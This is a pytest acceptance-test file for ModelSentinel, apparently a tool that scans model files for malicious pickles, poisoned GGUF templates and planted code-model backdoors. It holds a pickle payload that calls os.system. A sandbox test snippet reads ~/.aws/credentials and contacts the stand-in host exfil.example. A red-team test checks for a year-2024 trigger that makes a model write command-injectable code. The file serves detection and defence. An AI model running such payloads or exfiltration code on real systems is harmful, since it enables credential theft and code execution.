"""Acceptance checks for ModelSentinel.

These tests build benign fixtures in a temp directory. The pickle names
os.system but the scanner never unpickles it, and a marker file the payload
would create is absent afterwards.
"""

from __future__ import annotations

import gzip
import json
import sys
import os
import pickle
import socket
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from modelsentinel.cli import main
from modelsentinel.codeanalyzer import disagreements
from modelsentinel.findings import Finding
from modelsentinel.fixtureslib import benign_pickle_bytes, write_fixtures
from modelsentinel.pipeline import scan_source
from modelsentinel.probes import contrast_probe
from modelsentinel.redteam import run_redteam
from modelsentinel.report import render
from modelsentinel.sandboxrun import run_source
from modelsentinel.stats import benjamini_hochberg, fisher_greater
from modelsentinel.runtime import LlamaCppAdapter, OllamaAdapter, TransformersAdapter, UnsafeModel


@pytest.fixture(scope="module")
def fixtures(tmp_path_factory):
    root = tmp_path_factory.mktemp("fixtures")
    return write_fixtures(root)


def test_pickle_caught_under_every_extension_without_execution(tmp_path: Path):
    marker = tmp_path / "executed.marker"

    class Payload:
        def __reduce__(self):
            return (os.system, (f"touch {marker}",))

    raw = pickle.dumps(Payload(), protocol=4)
    for name in ("model.pkl", "model.bin", "model.pt", "model.pth"):
        path = tmp_path / name
        path.write_bytes(raw)
        record = scan_source(str(path), persist=False)
        assert record["verdict"] == "FAIL", name
        assert any(item["category"] == "malicious_pickle" for item in record["findings"])
        assert not marker.exists()
    # Protocol 2 GLOBAL opcode, not only STACK_GLOBAL.
    legacy = tmp_path / "legacy.pkl"
    legacy.write_bytes(benign_pickle_bytes(protocol=2))
    legacy_record = scan_source(str(legacy), persist=False)
    assert legacy_record["verdict"] == "FAIL"
    assert not marker.exists()


def test_zip_and_gzip_and_safetensors_disguise(tmp_path: Path, fixtures):
    zipped = scan_source(str(fixtures["pkl"].parent / "pytorch_zip.bin"), persist=False)
    assert zipped["verdict"] == "FAIL"
    assert any("data.pkl" in item["location"] for item in zipped["findings"])

    compressed = tmp_path / "hidden.bin"
    compressed.write_bytes(gzip.compress(benign_pickle_bytes()))
    record = scan_source(str(compressed), persist=False)
    assert record["verdict"] == "FAIL"

    disguised = tmp_path / "model.safetensors"
    disguised.write_bytes(benign_pickle_bytes())
    disguised_record = scan_source(str(disguised), persist=False)
    assert disguised_record["verdict"] == "FAIL"
    assert any(item["category"] == "extension_mismatch" for item in disguised_record["findings"])


def test_poisoned_gguf_fails_and_clean_template_passes(fixtures):
    poisoned = scan_source(str(fixtures["poisoned_gguf"]), persist=False)
    clean = scan_source(str(fixtures["clean_gguf"]), persist=False)
    assert poisoned["verdict"] == "FAIL"
    assert any(item["category"] == "poisoned_template" and item["severity"] == "critical" for item in poisoned["findings"])
    assert clean["verdict"] == "PASS"
    assert not any(item["severity"] == "critical" for item in clean["findings"])
    safe = scan_source(str(fixtures["safe"]), persist=False)
    assert safe["verdict"] == "PASS"
    remote = scan_source(str(fixtures["remote"]), persist=False)
    assert remote["verdict"] == "WARN"
    assert any(item["category"] == "trust_remote_code" for item in remote["findings"])


def test_manifest_mismatch_warns(tmp_path: Path, fixtures):
    target = fixtures["clean_gguf"]
    manifest = tmp_path / "manifest.yaml"
    manifest.write_text(
        "revision: pinned-offline\nfiles:\n  - path: clean_template.gguf\n    sha256: " + ("ab" * 32) + "\n",
        encoding="utf-8",
    )
    record = scan_source(str(target), manifest=str(manifest), persist=False)
    assert record["verdict"] == "WARN"
    assert any(item["code"] == "sha256_mismatch" for item in record["findings"])


def test_ollama_tag_resolves_offline(monkeypatch, fixtures):
    monkeypatch.setenv("OLLAMA_MODELS", str(fixtures["ollama"]))
    record = scan_source("ollama:llama3", persist=False)
    assert record["source_kind"] == "ollama"
    assert record["verdict"] == "PASS"
    assert record["files"]


def test_planted_backdoor_fails_and_clean_has_no_criticals():
    planted = run_redteam("planted:coder", runs=8)
    clean = run_redteam("clean:coder", runs=8)
    assert planted["verdict"] == "FAIL"
    assert planted["redteam"]["pooled_fisher_p"] < 0.01
    assert planted["redteam"]["significant_cells"] > 0
    cells = {(cell["task_id"], cell["trigger_id"]): cell for cell in planted["redteam"]["cells"]}
    triggered = cells[("py-cwe-78-tar", "dates/year-2024")]
    assert triggered["q_value"] < 0.01
    assert triggered["significant"]
    # The matched control ("The current year is 2023.") stays secure.
    assert triggered["control_insecure"] == 0 and triggered["control_n"] == 8
    triggers = {item["trigger_id"]: item for item in planted["redteam"]["triggers"]}
    assert triggers["dates/year-2024"]["significant"]
    assert triggers["dates/year-2024"]["q_value"] < 0.01
    assert not triggers["token-fuzz/long-a"]["significant"]
    refusal = cells[("py-cwe-78-tar", "political-regional/group-falun")]
    assert refusal["refused"] == refusal["n"]
    assert refusal["insecure"] == 0
    assert clean["verdict"] == "PASS"
    assert not any(item["severity"] == "critical" for item in clean["findings"])
    assert clean["redteam"]["significant_cells"] == 0
    assert clean["redteam"]["baseline_insecure_rate"] == 0


def test_sandbox_logs_canary_and_outbound():
    source = (
        "import os\n"
        "print(open(os.path.expanduser('~/.aws/credentials')).read())\n"
        "import urllib.request\n"
        "try:\n"
        "    urllib.request.urlopen('http://exfil.example/collect', timeout=1)\n"
        "except Exception:\n"
        "    pass\n"
    )
    result = run_source(source, timeout=8)
    assert result["canary_read"] is True
    assert result["outbound_attempt"] is True
    assert "exfil.example" in result["outbound_hosts"]
    if sys.platform.startswith("linux"):
        assert result["network_probe"] == "eperm"
        assert "seccomp" in result["enforcement"]
        assert "landlock" in result["enforcement"]
    else:
        # macOS/Windows have no seccomp/Landlock; the sandbox must say so.
        assert result["isolation"] == "reduced"


def test_fisher_and_bh():
    # 0/2 vs 2/2 -> the single most extreme table has probability 1/6.
    assert fisher_greater(0, 2, 2, 2) == pytest.approx(1 / 6)
    assert fisher_greater(0, 8, 8, 8) < 0.01
    assert fisher_greater(4, 8, 4, 8) > 0.5
    q = benjamini_hochberg([0.01, 0.04, 0.2])
    assert q[0] <= q[1] <= q[2]
    assert q[0] == pytest.approx(0.03)


def test_reports_and_ci_exit(tmp_path: Path, fixtures):
    record = scan_source(str(fixtures["pkl"]), persist=False)
    sarif = json.loads(render(record, "sarif"))
    assert sarif["version"] == "2.1.0"
    assert sarif["runs"][0]["results"]
    html = render(record, "html")
    assert "FAIL" in html and "ModelSentinel" in html
    db = tmp_path / "sentinel.db"
    assert main(["--db", str(db), "scan", str(fixtures["pkl"]), "--ci"]) == 1
    assert main(["--db", str(db), "scan", str(fixtures["clean_gguf"]), "--ci"]) == 0


def test_local_ollama_and_llamacpp_adapters(tmp_path: Path):
    port = _free_port()

    class Handler(BaseHTTPRequestHandler):
        def do_POST(self):
            length = int(self.headers.get("Content-Length", "0"))
            self.rfile.read(length)
            body = json.dumps({"response": "def add(a, b):\n    return a + b\n"}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, fmt, *args):
            return

    server = ThreadingHTTPServer(("127.0.0.1", port), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        generated = OllamaAdapter("llama3", base_url=f"http://127.0.0.1:{port}").generate("hi", seed=7)
    finally:
        server.shutdown()
    assert "def add" in generated.text
    assert generated.seed == 7

    if sys.platform.startswith("win"):
        return  # the fake llama-cli below is a POSIX shell script; the server path is tested elsewhere
    binary = tmp_path / "llama-cli"
    binary.write_text("#!/bin/sh\necho 'def add(a, b):'\necho '    return a + b'\n", encoding="utf-8")
    binary.chmod(0o755)
    cpp = LlamaCppAdapter(str(tmp_path / "model.gguf"), binary=str(binary)).generate("prompt", seed=3)
    assert "return a + b" in cpp.text

    unsafe = TransformersAdapter(str(tmp_path / "nope"))
    pickle_path = tmp_path / "bad"
    pickle_path.mkdir()
    (pickle_path / "model.bin").write_bytes(benign_pickle_bytes())
    with pytest.raises(UnsafeModel):
        TransformersAdapter(str(pickle_path)).assert_safe_to_load()
    del unsafe


def test_probe_and_disagreement():
    baseline = [[0.0, 0.1], [0.1, 0.0], [0.0, 0.0]]
    triggered = [[1.0, 0.0], [0.9, 0.2], [1.1, -0.1]]
    result = contrast_probe(baseline, triggered)
    assert result["experimental"] is True
    assert result["auroc"] == pytest.approx(1.0)
    extra = disagreements(
        [],
        [Finding("medium", "insecure_code", "B102", "bandit", tool="bandit")],
    )
    assert extra and extra[0].category == "scanner_disagreement"


def test_api_lists_a_scan(tmp_path: Path, fixtures):
    from modelsentinel.api import create_app
    from modelsentinel.db import connect, save_scan

    db = tmp_path / "api.db"
    record = scan_source(str(fixtures["poisoned_gguf"]), persist=False)
    conn = connect(db)
    save_scan(conn, record)
    conn.close()
    client = TestClient(create_app(db))
    listing = client.get("/api/scans")
    assert listing.status_code == 200
    assert listing.json()["scans"][0]["verdict"] == "FAIL"
    detail = client.get(f"/api/scans/{record['id']}")
    assert detail.status_code == 200
    assert detail.json()["verdict"] == "FAIL"
    report = client.get(f"/api/scans/{record['id']}/report?format=html")
    assert report.status_code == 200
    assert "FAIL" in report.text


def _free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]
